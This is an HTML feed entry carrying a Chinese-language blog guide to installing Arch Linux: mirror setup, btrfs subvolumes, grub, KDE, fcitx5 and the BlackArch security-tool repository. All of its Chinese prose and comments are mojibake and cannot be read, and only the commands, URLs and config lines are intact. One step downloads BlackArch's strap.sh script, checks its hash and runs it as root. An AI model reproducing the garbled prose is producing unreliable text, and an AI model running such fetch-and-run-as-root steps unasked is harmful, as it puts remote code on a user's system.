    <content type="html"><![CDATA[<p><strong>é¦–å…ˆçš„é¦–å…ˆï¼Œæœ€é‡è¦çš„å‚è€ƒæ¥è‡ªäº<a href="https://arch.icekylin.online/guide/rookie/pre-install.html">archlinuxç®€æ˜æŒ‡å—</a></strong>ã€‚</p><h1>å†™åœ¨å‰é¢</h1><p>è¿™ç¯‡æ–‡ç« çš„ç›®çš„æ˜¯æ•´é½ï¼Œç®€æ˜åœ°å½’çº³ç¬”è€…è‡ªå·±æ—¥å¸¸linuxæ‰€æ¥è§¦åˆ°çš„ä¸€äº›ç»éªŒï¼Œå…å¾—åœ¨æœç´¢å¼•æ“å±é‡Œæ·˜é‡‘ã€‚ä½†æ˜¯ä½œè€…æœ¬äººçš„è®°æ€§å¾ˆä¸å¥½ï¼Œæ‰€ä»¥å¯èƒ½æœ‰æ‰€ç¼ºç–ã€‚ç‰¹åˆ«åœ°ï¼Œæœ¬æ–‡å°¤å…¶é’ˆå¯¹çš„æ˜¯<code>ArchLinux</code>è¿™ä¸€å‘è¡Œç‰ˆã€‚</p><h1>ä½ æ˜¯å¦éœ€è¦ä»0å¼€å§‹å®‰è£…ä¸€ä¸ªåŸºæœ¬ç³»ç»Ÿï¼Ÿ</h1><p>ç›´æ¥å‚è€ƒ<a href="https://arch.icekylin.online/guide/rookie/pre-install.html">archlinuxç®€æ˜æŒ‡å—</a>ï¼Œæ­£å¦‚æŒ‡å—ä¸­å¼ºè°ƒçš„ï¼Œä¸è¦è¯•å›¾æ›´æ”¹ä¸€äº›æŒ‡å—ä¸­æä¾›çš„è®¾ç½®ï¼Œé™¤éä½ <strong>çœŸçš„çœŸçš„å®Œå…¨çŸ¥é“</strong>è‡ªå·±åœ¨åšä»€ä¹ˆã€‚è¿™éƒ¨åˆ†çš„ç»éªŒå¯¹äºæ‰€æœ‰æ“ä½œç³»ç»Ÿåº”å½“éƒ½æ˜¯ç±»ä¼¼çš„ã€‚</p><p>ç®€å•æ¥è¯´å°±æ˜¯ï¼š</p><ul class="lvl-0"><li class="lvl-2"><p>åŒæ­¥æ—¶é—´ï¼Œè”ç½‘ï¼Œæ¢æº</p></li><li class="lvl-2"><p>åˆ†åŒºå’Œæ ¼å¼åŒ–ï¼Œefiï¼Œäº¤æ¢åˆ†åŒºå’Œä¸»åˆ†åŒºï¼ˆbtrfsï¼‰</p></li><li class="lvl-2"><p>æŒ‚è½½å¹¶å®‰è£…ç³»ç»Ÿï¼Œè®¾ç½®åŸºæœ¬ä¿¡æ¯å¦‚æ—¶åŒºï¼Œç”¨æˆ·åå¯†ç </p></li><li class="lvl-2"><p>å®‰è£…å¼•å¯¼ç¨‹åºå’Œå…¶ä»–å¿…é¡»ç»„ä»¶</p></li></ul><p>ç”±äºpacmançš„å¼ºå¤§ï¼Œè¿‡ç¨‹å¹¶ä¸å›°éš¾</p><h2 id="btrfs">btrfs</h2><blockquote><p>åŒæ ·ï¼Œå¯ä»¥é˜…è¯»archlinuxç®€æ˜æŒ‡å—ä¸Šçš„<a href="https://arch.icekylin.online/guide/advanced/btrfs.html">ä»‹ç»</a>ä¸è¦å®‰è£…ä¼ ç»Ÿçš„ext4 linuxæ–‡ä»¶ç³»ç»Ÿï¼Œä½¿ç”¨æ›´å¥½çš„btrfsã€‚æˆ‘ä»¬ä¸å…³å¿ƒå…·ä½“æ€ä¹ˆå®ç°çš„ï¼ŒåªçŸ¥é“è¿™æ˜¯ä¸€ä¸ªæä¾›äº†å¾ˆå¤šå¾ˆå¥½ç‰¹æ€§çš„æ–‡ä»¶ç³»ç»Ÿå³å¯ã€‚</p></blockquote><p>å°¤å…¶æ˜¯å¯¹äºï¼š</p><ul class="lvl-0"><li class="lvl-2"><p>SSDçš„å¤§å¹…ä¼˜åŒ–ï¼ŒåŒ…æ‹¬å†™æ—¶å¤åˆ¶å’Œé€æ˜å‹ç¼©ç‰¹æ€§</p></li><li class="lvl-2"><p>å­å·å’Œå…‹éš†ç‰¹æ€§è®©å…¶æ”¯æŒéå¸¸æ–¹ä¾¿çš„å¿«ç…§ï¼ˆç”šè‡³æ˜¯å¿«ç…§çš„å¿«ç…§ï¼‰</p></li></ul><p>å…¶ä¸­ï¼Œåè€…ç‰¹æ€§å¯¹äºarchlinuxæ˜¯éå¸¸é‡è¦çš„ï¼Œå› ä¸ºarchä¸åœåœ°åœ¨æ»šåŠ¨æ›´æ–°ï¼Œæˆ‘ä»¬æŠ˜è…¾çš„æ—¶å€™ä¼šéå¸¸æœ‰å¸®åŠ©ã€‚é‡‡ç”¨ç¥å¥‡çš„btrfsåï¼Œæˆ‘ä»¬çš„ç³»ç»Ÿå°±èƒ½ç”¨<strong>æå…¶</strong>å°çš„ç©ºé—´è¿›è¡Œå¢é‡å¿«ç…§å¤‡ä»½ã€‚ï¼ˆè€Œç›¸å¯¹çš„ï¼Œä½¿ç”¨ext4ç¬¦åˆæˆ‘ä»¬çš„ç›´è§‰â€”â€”å¿«ç…§éœ€è¦æ‹·è´æ•´ä¸ªç£ç›˜ï¼‰</p><h2 id="è¿™ä¸€éƒ¨åˆ†çš„å¿«é€Ÿå‘½ä»¤æŒ‡å—ï¼š">è¿™ä¸€éƒ¨åˆ†çš„å¿«é€Ÿå‘½ä»¤æŒ‡å—ï¼š</h2><p>LiveCDä½¿ç”¨windowsä¸‹çš„rufusåˆ¶ä½œã€‚ä¸‹é¢æˆ‘ä¼šåˆ—å‡ºarchlinuxç®€æ˜æŒ‡å—ä¸Šæ‰€æœ‰ç›¸å…³çš„å‘½ä»¤å’Œä½œç”¨ã€‚è¿™ä¸€éƒ¨åˆ†å‡è®¾ä¸ä¼šé‡åˆ°ä»»ä½•çš„é—®é¢˜å’ŒæŠ¥é”™ã€‚</p><blockquote><p>LiveCDç¯å¢ƒä¸‹:</p></blockquote><h3 id="åŒæ­¥æ—¶é—´ï¼Œè”ç½‘ï¼Œæ¢æº">åŒæ­¥æ—¶é—´ï¼Œè”ç½‘ï¼Œæ¢æº</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#-- ç¦ç”¨é•œåƒå†…çš„è‡ªåŠ¨æ›´æ–°æºæœåŠ¡ï¼Œäººåœ¨å›½å¤–çš„å°±æ— æ‰€è°“äº†</span><br><span class="line">systemctl stop reflector.service</span><br><span class="line"># æ£€æŸ¥çŠ¶æ€</span><br><span class="line">systemctl status reflector.service</span><br><span class="line"></span><br><span class="line">#-- æ— çº¿è¿æ¥ç½‘ç»œï¼Œæœ‰çº¿åº”å½“è‡ªåŠ¨è¿æ¥</span><br><span class="line">iwctl # è¿›å…¥äº¤äº’å¼å‘½ä»¤è¡Œ</span><br><span class="line">device list # åˆ—å‡ºæ— çº¿ç½‘å¡è®¾å¤‡åï¼Œæ¯”å¦‚æ— çº¿ç½‘å¡çœ‹åˆ°å« wlan0</span><br><span class="line">station wlan0 scan # æ‰«æç½‘ç»œ</span><br><span class="line">station wlan0 get-networks # åˆ—å‡ºæ‰€æœ‰ wifi ç½‘ç»œ</span><br><span class="line">station wlan0 connect wifi-name # è¿›è¡Œè¿æ¥ï¼Œæ³¨æ„è¿™é‡Œæ— æ³•è¾“å…¥ä¸­æ–‡ã€‚å›è½¦åè¾“å…¥å¯†ç å³å¯</span><br><span class="line">exit # è¿æ¥æˆåŠŸåé€€å‡º</span><br><span class="line"></span><br><span class="line">#-- æ›´æ–°æ—¶é’Ÿ</span><br><span class="line">timedatectl set-ntp true</span><br><span class="line"># æ£€æŸ¥</span><br><span class="line">timedatectl status</span><br><span class="line"></span><br><span class="line">#--æ¢æº</span><br><span class="line">vim /etc/pacman.d/mirrorlist</span><br><span class="line"># æ·»åŠ å›½å†…æºï¼Œå¦‚æœè‡ªå·±çš„å­¦æ ¡æœ‰ä¼˜å…ˆç”¨è‡ªå·±çš„ï¼Œæ”¾åœ¨æœ€ä¸Šé¢</span><br><span class="line"># ä¸è¦åœ¨è¿™ä¸€æ­¥æ·»åŠ archlinuxcn</span><br><span class="line">Server = https://mirrors.hust.edu.cn/archlinux/$repo/os/$arch # åç§‘çš„</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinux/$repo/os/$arch # ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦å¼€æºé•œåƒç«™</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch # æ¸…åå¤§å­¦å¼€æºè½¯ä»¶é•œåƒç«™</span><br><span class="line">Server = https://repo.huaweicloud.com/archlinux/$repo/os/$arch # åä¸ºå¼€æºé•œåƒç«™</span><br><span class="line">Server = http://mirror.lzu.edu.cn/archlinux/$repo/os/$arch # å…°å·å¤§å­¦å¼€æºé•œåƒç«™</span><br></pre></td></tr></table></figure><h3 id="åˆ†åŒºå’Œæ ¼å¼åŒ–">åˆ†åŒºå’Œæ ¼å¼åŒ–</h3><p>é‡åˆ°çš„é—®é¢˜æˆ–æƒ³ä½¿ç”¨ext4åˆ†åŒºè¯·å‚è€ƒ<a href="https://arch.icekylin.online/guide/rookie/basic-install-detail.html">ArchLinuxç®€æ˜æŒ‡å—</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsblk # æŸ¥çœ‹è®¾å¤‡</span><br><span class="line">cfdisk /dev/sd_ </span><br></pre></td></tr></table></figure><p><font color=lightyellow>æ³¨æ„âš ï¸ï¼Œcfdiskå¯¹äºå¤§å°çš„è®¾ç½®æ˜¯Må’ŒGè€Œä¸æ˜¯Mbå’ŒGbï¼Œè¾“å…¥Mbå’ŒGbä¹Ÿèƒ½è¯†åˆ«ä½†å¤§å°ä¼šæœ‰è¯¯ï¼ŒåŠ¡å¿…æ£€æŸ¥</font></p><p>cfdiskçš„ç•Œé¢å®Œå…¨æ˜¯å¯è¯»çš„ã€‚å‚è€ƒç®€æ˜æŒ‡å—å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># æ£€æŸ¥</span><br><span class="line">fdisk -l</span><br></pre></td></tr></table></figure><p>æ ¼å¼åŒ–æ“ä½œå¦‚ä¸‹ï¼Œå¦‚æœå’Œwindowså…±å­˜åˆ™ä¸è¦æ ¼å¼åŒ–efiåˆ†åŒºï¼Œä»¥ä¸‹æ“ä½œéƒ½æ˜¯å¯¹<strong>æ–°</strong>ç©ºé—´æ“ä½œçš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#efi</span><br><span class="line">mkfs.fat -F32 /dev/sdxn #sata</span><br><span class="line">mkfs.fat -F32 /dev/nvmexn1pn # nvme</span><br><span class="line"></span><br><span class="line">mkswap /dev/sdxn #swap</span><br><span class="line"></span><br><span class="line">mkfs.btrfs -L MyArch /dev/sdxn #btrfs,-Læ˜¯åå­—-labelï¼Œæ— ç‰¹æ®Šå­—ç¬¦å’Œç©ºæ ¼</span><br></pre></td></tr></table></figure><p>è®¾ç½®btrfs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mount -t btrfs -o compress=zstd /dev/sdxn /mnt #æŒ‚è½½</span><br><span class="line"># è¿™æ˜¯ä¸ºäº†ä½¿ç”¨timeshiftåšå‡†å¤‡ï¼Œè¯·å°½å¯èƒ½ä¸¥æ ¼æŒ‰ç…§è¿™ä¸ªåˆ†åŒºå‘½åå’Œè®¾ç½®</span><br><span class="line">btrfs subvolume create /mnt/@ # åˆ›å»º / ç›®å½•å­å·</span><br><span class="line">btrfs subvolume create /mnt/@home # åˆ›å»º /home ç›®å½•å­å·</span><br><span class="line">btrfs subvolume list -p /mnt #æ£€æŸ¥</span><br><span class="line">umount /mnt</span><br><span class="line"># æŒ‚è½½ç³»ç»Ÿ</span><br><span class="line">mount -t btrfs -o subvol=/@,compress=zstd /dev/sdxn /mnt # æŒ‚è½½ / ç›®å½•</span><br><span class="line">mkdir /mnt/home # åˆ›å»º /home ç›®å½•</span><br><span class="line">mount -t btrfs -o subvol=/@home,compress=zstd /dev/sdxn /mnt/home # æŒ‚è½½ /home ç›®å½•</span><br><span class="line">mkdir -p /mnt/boot # åˆ›å»º /boot ç›®å½•</span><br><span class="line">mount /dev/sdxn /mnt/boot # æŒ‚è½½ /boot ç›®å½•</span><br><span class="line">swapon /dev/sdxn # æŒ‚è½½äº¤æ¢åˆ†åŒº</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…ç³»ç»Ÿ">å®‰è£…ç³»ç»Ÿ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pacstrap /mnt base base-devel linux linux-firmware btrfs-progs</span><br><span class="line"># å¦‚æœä½¿ç”¨btrfsæ–‡ä»¶ç³»ç»Ÿï¼Œé¢å¤–å®‰è£…ä¸€ä¸ªbtrfs-progsåŒ…</span><br><span class="line">pacstrap /mnt networkmanager vim sudo zsh zsh-completions # å…¶å®bashä¹Ÿè¡Œ</span><br><span class="line"></span><br><span class="line">genfstab -U /mnt &gt; /mnt/etc/fstab</span><br><span class="line">cat /mnt/etc/fstab # æ£€æŸ¥</span><br><span class="line"></span><br><span class="line">arch-chroot /mnt # åˆ‡æ¢</span><br></pre></td></tr></table></figure><blockquote><p>ğŸ’¡Tips: æ³¨æ„ï¼Œåœ¨æˆ‘ä»¬çš„ç³»ç»Ÿæ— æ³•å¯åŠ¨ä»€ä¹ˆä¹Ÿåšä¸äº†çš„æ—¶å€™ï¼ŒåŒæ ·å¯ä»¥ç”¨livecdçš„è¿™ä¸ªå‘½ä»¤æ£€æŸ¥ä¿®å¤</p></blockquote><p>ä»è¿™ä¸€æ­¥åï¼Œæˆ‘ä»¬å°±è¿›å…¥äº†çœŸæ­£çš„ç³»ç»Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hostname # è¾“å…¥ä¸»æœºåå³å¯</span><br><span class="line">vim /etc/hosts #é…ç½®æœ¬åœ°hostså¦‚ä¸‹</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1   localhost</span><br><span class="line">::1         localhost</span><br><span class="line">127.0.1.1   myarch.localdomain myarch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime # æ—¶åŒº</span><br><span class="line">hwclock --systohc # ç¡¬ä»¶åŒæ­¥æ—¶é—´</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/locale.gen # å»æ‰enUSå’ŒzhCN ä¸¤ä¸ªutf8çš„æ³¨é‡Š</span><br><span class="line">locale-gen</span><br><span class="line">echo &#x27;LANG=en_US.UTF-8&#x27;  &gt; /etc/locale.conf</span><br><span class="line"></span><br><span class="line">passwd root</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pacman -S intel-ucode <span class="comment"># Intel å¾®ç </span></span><br><span class="line">pacman -S amd-ucode <span class="comment"># AMD</span></span><br></pre></td></tr></table></figure><h3 id="grubå¼•å¯¼">grubå¼•å¯¼</h3><p>å»ºè®®é…ç½®ï¼Œgrubå¼•å¯¼æ¯”æ²¡æœ‰å¼ºï¼Œä½œè€…ä¹‹å‰ä¸ç”¨ï¼Œuç›˜ç›´æ’å¯åŠ¨ï¼Œå†…æ ¸å‚æ•°ç›¸å…³çš„é…ç½®ç¨å¾®ç¹çä¸€ç‚¹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pacman -S grub efibootmgr os-prober</span><br><span class="line">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=ARCH</span><br><span class="line">vim /etc/default/grub</span><br></pre></td></tr></table></figure><p>é…ç½®grubå‚æ•°éœ€è¦ï¼š</p><ul class="lvl-0"><li class="lvl-2"><p>GRUB_CMDLINE_LINUX_DEFAULTå†…æ ¸å‚æ•°å»æ‰quietï¼Œloglevel=5æ–¹ä¾¿è§‚å¯Ÿ</p></li><li class="lvl-2"><p>åŠ å…¥nowatchdogï¼ˆå‚è€ƒ<a href="https://arch.icekylin.online/guide/rookie/basic-install.html#_17-%E5%AE%89%E8%A3%85%E5%BC%95%E5%AF%BC%E7%A8%8B%E5%BA%8F">è¿™é‡Œ</a>ï¼‰</p></li><li class="lvl-2"><p>å¦‚æœè¦é…ç½®nå¡é©±åŠ¨æ€•ç­‰ä¸‹é‡åˆ°é—®é¢˜ï¼Œå¯ä»¥æå‰åŠ å…¥ibt=offç­‰</p></li><li class="lvl-2"><p>å–æ¶ˆæœ€åä¸€è¡Œçš„GRUB_DISABLE_OS_PROBER=falseæ³¨é‡Šï¼Œå¦‚æœè¦å¼•å¯¼winçš„è¯</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br><span class="line"></span><br><span class="line">exit # é€€å›å®‰è£…ç¯å¢ƒ</span><br><span class="line">umount -R /mnt # å¸è½½æ–°åˆ†åŒº</span><br><span class="line">reboot # é‡å¯</span><br></pre></td></tr></table></figure><h3 id="é‡å¯å">é‡å¯å</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable --now NetworkManager</span><br><span class="line"># æ— çº¿ï¼š</span><br><span class="line">nmcli dev wifi list # æ˜¾ç¤ºé™„è¿‘çš„ Wi-Fi ç½‘ç»œ</span><br><span class="line">nmcli dev wifi connect &quot;Wi-Fiåï¼ˆSSIDï¼‰&quot; password &quot;ç½‘ç»œå¯†ç &quot; # è¿æ¥æŒ‡å®šçš„æ— çº¿ç½‘ç»œ</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bash_profile #æ·»åŠ  export EDITOR=&#x27;vim&#x27;</span><br><span class="line">useradd -m -G wheel -s /bin/bash myusername</span><br><span class="line">passwd myusername</span><br><span class="line">EDITOR=vim visudo # è¿™é‡Œéœ€è¦æ˜¾å¼çš„æŒ‡å®šç¼–è¾‘å™¨ï¼Œå› ä¸ºä¸Šé¢çš„ç¯å¢ƒå˜é‡è¿˜æœªç”Ÿæ•ˆ</span><br><span class="line"># å–æ¶ˆæ³¨é‡Šè¿™ä¸€è¡Œï¼š </span><br><span class="line">#%wheel ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><p>å¼€å¯pacman32ä½å’Œarchlinuxcnï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/pacman.conf</span><br><span class="line"># å»æ‰multilibæ³¨é‡Š</span><br><span class="line"># æ·»åŠ ï¼ˆé€‰ä¸€ä¸ªä¹Ÿè¡Œï¼‰ï¼š</span><br><span class="line">[archlinuxcn]</span><br><span class="line">Server = https://mirrors.hust.edu.cn/archlinuxcn/$arch</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch # ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦å¼€æºé•œåƒç«™</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch # æ¸…åå¤§å­¦å¼€æºè½¯ä»¶é•œåƒç«™</span><br><span class="line">Server = https://mirrors.hit.edu.cn/archlinuxcn/$arch # å“ˆå°”æ»¨å·¥ä¸šå¤§å­¦å¼€æºé•œåƒç«™</span><br><span class="line">Server = https://repo.huaweicloud.com/archlinuxcn/$arch # åä¸ºå¼€æºé•œåƒç«™</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -Syyu</span><br></pre></td></tr></table></figure><h1>æ›´ç»†èŠ‚çš„è®¾ç½®å‘½ä»¤</h1><h2 id="å®‰è£…æ¡Œé¢å’Œå¿…å¤‡å…¶ä»–ç»„ä»¶">å®‰è£…æ¡Œé¢å’Œå¿…å¤‡å…¶ä»–ç»„ä»¶</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pacman -S plasma-meta konsole dolphin # plasma-meta å…ƒè½¯ä»¶åŒ…ã€konsole ç»ˆç«¯æ¨¡æ‹Ÿå™¨å’Œ dolphin æ–‡ä»¶ç®¡ç†å™¨</span><br><span class="line">pacman -S  plasma-workspace xdg-desktop-portal egl-wayland</span><br><span class="line"># Nå¡ç”¨æˆ·éœ€è¦é¢å¤–å®‰è£…egl-wayland,xdg-desktop-portalåŒ…æ˜¯ä¸ºäº†å¦‚obsæ­¤ç±»å·¥å…·å½•åˆ¶å±å¹•ä½¿ç”¨</span><br><span class="line"># xdg-desktop-portalåŒ…ç»„æä¾›äº†ä¸åŒç¯å¢ƒä¸‹ä½¿ç”¨çš„è½¯ä»¶åŒ…</span><br><span class="line"># ä¾‹å¦‚kdeç”¨æˆ·å¯é€‰æ‹©xdg-desktop-portal-kdeåŒ…</span><br><span class="line">systemctl enable sddm</span><br><span class="line">systemctl start sddm  # æˆ–è€…é‡å¯reboot</span><br><span class="line"># nå¡æ¨èx11å¯åŠ¨</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S sof-firmware alsa-firmware alsa-ucm-conf # å£°éŸ³å›ºä»¶</span><br><span class="line">sudo pacman -S ntfs-3g # ä½¿ç³»ç»Ÿå¯ä»¥è¯†åˆ« NTFS æ ¼å¼çš„ç¡¬ç›˜ï¼ŒåŒç³»ç»Ÿå¿…è£…ï¼Œwinæ˜¯ntfs</span><br><span class="line">sudo pacman -S adobe-source-han-serif-cn-fonts wqy-zenhei # å®‰è£…å‡ ä¸ªå¼€æºä¸­æ–‡å­—ä½“ã€‚ä¸€èˆ¬è£…ä¸Šæ–‡æ³‰é©¿å°±èƒ½è§£å†³å¤§å¤š wine åº”ç”¨ä¸­æ–‡æ–¹å—çš„é—®é¢˜</span><br><span class="line">sudo pacman -S noto-fonts noto-fonts-cjk noto-fonts-emoji noto-fonts-extra # å®‰è£…è°·æ­Œå¼€æºå­—ä½“åŠè¡¨æƒ…</span><br><span class="line">sudo pacman -S ark # å‹ç¼©è½¯ä»¶ã€‚åœ¨ dolphin ä¸­å¯ç”¨å³é”®è§£å‹å‹ç¼©åŒ…</span><br><span class="line">sudo pacman -S gwenview # å›¾ç‰‡æŸ¥çœ‹å™¨</span><br><span class="line">sudo pacman -S archlinuxcn-keyring # cn æºä¸­çš„ç­¾åï¼ˆarchlinuxcn-keyring åœ¨ archlinuxcnï¼‰</span><br><span class="line">sudo pacman -S yay # yay å‘½ä»¤å¯ä»¥è®©ç”¨æˆ·å®‰è£… AUR ä¸­çš„è½¯ä»¶ï¼ˆyay åœ¨ archlinuxcnï¼‰</span><br></pre></td></tr></table></figure><h2 id="è¾“å…¥æ³•">è¾“å…¥æ³•</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S fcitx5-im # è¾“å…¥æ³•åŸºç¡€åŒ…ç»„</span><br><span class="line">sudo pacman -S fcitx5-chinese-addons # å®˜æ–¹ä¸­æ–‡è¾“å…¥å¼•æ“</span><br><span class="line">sudo pacman -S fcitx5-anthy # æ—¥æ–‡è¾“å…¥å¼•æ“</span><br><span class="line">sudo pacman -S fcitx5-pinyin-moegirl # èŒå¨˜ç™¾ç§‘è¯åº“ã€‚äºŒåˆºçŒ¿å¿…å¤‡ï¼ˆarchlinuxcnï¼‰</span><br><span class="line">sudo pacman -S fcitx5-material-color # è¾“å…¥æ³•ä¸»é¢˜</span><br></pre></td></tr></table></figure><p>ç¼–è¾‘<code>~/.config/environment.d/im.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># fix fcitx problem</span><br><span class="line">GTK_IM_MODULE=fcitx</span><br><span class="line">QT_IM_MODULE=fcitx</span><br><span class="line">XMODIFIERS=@im=fcitx</span><br><span class="line">SDL_IM_MODULE=fcitx</span><br><span class="line">GLFW_IM_MODULE=ibus</span><br></pre></td></tr></table></figure><p>æ›´è¿›ä¸€æ­¥çš„é…ç½®/æ›´å¥½ç”¨çš„è¾“å…¥æ³•å‚è§<a href="https://arch.icekylin.online/guide/advanced/optional-cfg-1#%F0%9F%8D%80%EF%B8%8F-%E8%BE%93%E5%85%A5%E6%B3%95">å¯é€‰é…ç½®</a></p><h2 id="timeshift">timeshift</h2><p>pacmanå°±è¡Œï¼Œå‚è€ƒ<a href="https://arch.icekylin.online/guide/rookie/desktop-env-and-app.html">åº”ç”¨å®‰è£…</a></p><h2 id="blackArch">blackArch</h2><p><a href="https://www.blackarch.org/downloads.html">å®˜ç½‘</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Run https://blackarch.org/strap.sh as root and follow the instructions.</span><br><span class="line"></span><br><span class="line">$ curl -O https://blackarch.org/strap.sh</span><br><span class="line"># Verify the SHA1 sum</span><br><span class="line"></span><br><span class="line">$ echo bbf0a0b838aed0ec05fff2d375dd17591cbdf8aa strap.sh | sha1sum -c</span><br><span class="line"># Set execute bit</span><br><span class="line"></span><br><span class="line">$ chmod +x strap.sh</span><br><span class="line"># Run strap.sh</span><br><span class="line"></span><br><span class="line">$ sudo ./strap.sh</span><br><span class="line"># Enable multilib following https://wiki.archlinux.org/index.php/Official_repositories#Enabling_multilib and run:</span><br><span class="line"></span><br><span class="line">$ sudo pacman -Syu</span><br></pre></td></tr></table></figure><h1>æ˜¾å¡é©±åŠ¨</h1><p>è¿™é‡Œçš„æ‰€æœ‰å†…å®¹åªé€‚ç”¨äºiu+nå¡ï¼Œå…¶ä»–è¯·å‚è€ƒarchwikiæˆ–archlinuxç®€æ˜æ•™ç¨‹å¯¹åº”çš„éƒ¨åˆ†ã€‚å¦‚æœä½ ä¹Ÿæ˜¯åŒæ ·é…ç½®å¹¶ä¸”éœ€è¦ç¬”è®°æœ¬åŒæ˜¾å¡ï¼Œä¸‹é¢çš„å†…å®¹å¯èƒ½ä¼šå¾ˆç®¡ç”¨ã€‚ä¸ªäººç¬”è®°æœ¬æ˜¯y9000x 